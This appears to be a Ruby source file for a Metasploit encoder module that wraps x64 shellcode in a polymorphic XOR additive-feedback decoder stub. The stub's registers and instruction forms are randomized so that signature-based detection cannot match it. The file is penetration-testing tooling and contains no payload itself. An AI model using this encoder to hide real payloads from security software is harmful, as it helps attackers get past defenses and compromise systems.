##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasm'

class MetasploitModule < Msf::Encoder
  Rank = ExcellentRanking

  REG_POOL = %w[rax rbx rcx rdx rsi rdi r8 r9 r10 r11 r12 r13 r14 r15].freeze

  REG32 = {
    'rax' => 'eax', 'rbx' => 'ebx', 'rcx' => 'ecx', 'rdx' => 'edx',
    'rsi' => 'esi', 'rdi' => 'edi',
    'r8'  => 'r8d', 'r9'  => 'r9d', 'r10' => 'r10d', 'r11' => 'r11d',
    'r12' => 'r12d', 'r13' => 'r13d', 'r14' => 'r14d', 'r15' => 'r15d'
  }.freeze

  def initialize
    super(
      'Name'        => 'x64 Polymorphic XOR Additive Feedback Encoder',
      'Description' => %q{
        Polymorphic x64 XOR encoder with additive key feedback.
        Each encoding run randomizes the register selection, instruction
        forms, and initialization block ordering so the decoder stub
        signature varies while the algorithm remains constant.
        Payloads are encoded using reverse-order XOR additive feedback
        keying so the count-indexed decoder loop processes them in the
        same order with a self-evolving key.
      },
      'Author'      => 'msf',
      'Arch'        => ARCH_X64,
      'License'     => MSF_LICENSE,
      'EncoderType' => Msf::Encoder::Type::Raw,
      'Decoder'     => { 'KeySize' => 8, 'KeyPack' => 'Q<' }
    )
    @cpu = Metasm::X86_64.new
  end

  def encode(buf, badchars = nil, state = nil, _platform = nil)
    badchars ||= ''

    pad = (8 - (buf.length % 8)) % 8
    buf = buf + Rex::Text.rand_text(pad) if pad > 0
    count = buf.length / 8

    avoided = ['rsp'] + saved_regs
    pool = REG_POOL.reject { |r| avoided.include?(r) }.shuffle
    raise Msf::EncoderError, 'Insufficient free registers (need at least 3)' if pool.length < 3

    ptr_reg = pool[0]
    key_reg = pool[1]
    cnt_reg = pool[2]

    key_val = find_key(buf, badchars, count)
    raise Msf::EncoderError, 'Could not find a key free of bad characters' if key_val.nil?

    encoded = encode_payload(buf, key_val, count)
    stub    = build_stub(ptr_reg, key_reg, cnt_reg, key_val, count)

    stub + encoded
  end

  private

  def asm(src)
    Metasm::Shellcode.assemble(@cpu, src).encode_string
  end

  def saved_regs
    return [] unless datastore['SaveRegisters']
    datastore['SaveRegisters'].to_s.downcase.split(/[\s,]+/).map(&:strip)
  end

  # Encode blocks in reverse order so the count-down decoder processes
  # them with the same evolving key as the forward encoder.
  def encode_payload(buf, key_val, count)
    key = key_val
    enc = Array.new(count)
    (count - 1).downto(0) do |i|
      plain  = buf[i * 8, 8].unpack1('Q<')
      enc[i] = plain ^ key
      key    = (key + plain) & 0xFFFFFFFFFFFFFFFF
    end
    enc.pack('Q<*')
  end

  def find_key(buf, badchars, count)
    50.times do
      candidate = rand(0xFFFFFFFFFFFFFFFF) + 1
      next if [candidate].pack('Q<').bytes.any? { |b| badchars.include?(b.chr) }
      encoded = encode_payload(buf, candidate, count)
      next if encoded.bytes.any? { |b| badchars.include?(b.chr) }
      return candidate
    end
    nil
  end

  def build_stub(ptr_reg, key_reg, cnt_reg, key_val, count)
    init_a = counter_init_asm(cnt_reg, count)
    init_b = "mov #{key_reg}, 0x#{key_val.to_s(16)}"
    init_blocks = [init_a, init_b].shuffle.join("\n")

    dec_form  = %w[dec sub].sample == 'dec' ? "dec #{cnt_reg}" : "sub #{cnt_reg}, 1"
    test_form = case rand(3)
                when 0 then "test #{cnt_reg}, #{cnt_reg}"
                when 1 then "or #{cnt_reg}, #{cnt_reg}"
                else        "cmp #{cnt_reg}, 0"
                end

    src = <<~ASM
      jmp _call
    _pop:
      pop #{ptr_reg}
      #{init_blocks}
    _loop:
      #{dec_form}
      xor qword [#{ptr_reg} + (#{cnt_reg} * 8)], #{key_reg}
      add #{key_reg}, qword [#{ptr_reg} + (#{cnt_reg} * 8)]
      #{test_form}
      jnz _loop
      jmp #{ptr_reg}
    _call:
      call _pop
    ASM

    asm(src)
  rescue => e
    raise Msf::EncoderError, "Decoder stub assembly failed: #{e}"
  end

  def counter_init_asm(cnt_reg, count)
    cnt32 = REG32[cnt_reg]
    case rand(3)
    when 0
      "xor #{cnt_reg}, #{cnt_reg}\nmov #{cnt32}, #{count}"
    when 1
      "mov #{cnt_reg}, #{count}"
    else
      "push #{count}\npop #{cnt_reg}"
    end
  end
end
